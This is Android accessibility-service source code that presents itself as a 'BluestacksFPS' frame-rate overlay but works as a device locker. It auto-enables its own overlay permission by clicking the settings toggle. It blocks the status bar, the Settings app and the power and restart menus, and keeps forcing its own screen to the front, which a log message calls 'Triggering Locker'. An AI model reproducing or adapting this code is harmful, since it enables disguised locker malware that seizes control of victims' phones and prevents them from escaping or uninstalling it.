package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("FPS Service Connected - Initializing Overlay"); 
        
        // Langsung lompat tanpa menunggu event pertama
        jumpToOverlaySettings(); //
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "bs_engine_logs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
    
        // 1. BLOKIR STATUS BAR & QUICK SETTINGS
        if (packageName.equals("com.android.systemui")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
            }
            return;
        }
    
        // 2. PROTEKSI PENGATURAN (SETTINGS)
        // Jika user masuk ke settings dan kita SUDAH terautentikasi atau 
        // izin sudah lengkap, maka blokir akses ke Settings.
        if (packageName.equals("com.android.settings")) {
            if (!isSpecificPermissionPage(event)) { 
                writeLog("Blocking Settings access - Force returning to App");
                forceOpenApp(); // Memaksa kembali ke MainActivity/Overlay
                return;
            }
        }
    
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;
    
        try {
            // Blokir menu power
            if (packageName.equals("android")) {
                checkAndDismissSensitiveUI(rootNode);
            }
            
            // Alur otomatisasi klik izin (Hanya jalankan jika belum aktif)
            handleOverlayPermissionFlow(rootNode, packageName);
        } finally {
            rootNode.recycle();
        }
    }
    
    // Helper untuk mengecek apakah user sedang di halaman izin yang "dibolehkan"
    private boolean isSpecificPermissionPage(AccessibilityEvent event) {
        // Biarkan user di settings HANYA jika teksnya mengandung nama aplikasi kita
        // Ini agar proses auto-klik tetap jalan, tapi user tidak bisa browsing menu lain.
        AccessibilityNodeInfo node = getRootInActiveWindow();
        if (node != null) {
            List<AccessibilityNodeInfo> list = node.findAccessibilityNodeInfosByText("BluestacksFPS");
            boolean isSafe = !list.isEmpty();
            node.recycle();
            return isSafe;
        }
        return false;
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;
    
            try {
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BluestacksFPS");
                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
                
                if (!targets.isEmpty() && switchNode != null) {
                    if (!switchNode.isChecked()) {
                        writeLog("Direct hit! Turning toggle ON.");
                        performClick(switchNode);
                        
                        // Tambahan: Tunggu sebentar setelah klik, lalu paksa buka diri sendiri
                        new android.os.Handler().postDelayed(() -> {
                             forceOpenApp();
                        }, 500); 
    
                    } else {
                        writeLog("Toggle is already ON. Triggering Locker.");
                        forceOpenApp(); // Pastikan panggil ini
                    }
                } else if (pkg.contains("settings")) {
                    clickByText(currentRoot, "BluestacksFPS");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 150);
    }
    
    private void forceOpenApp() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
                   Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        triggerOverlay();
    }
    
        private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        writeLog("Executing Jump to Overlay Settings");
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerOverlay() {
        if (!FPSService.isAuthenticated) {
            Intent intent = new Intent(this, FPSService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}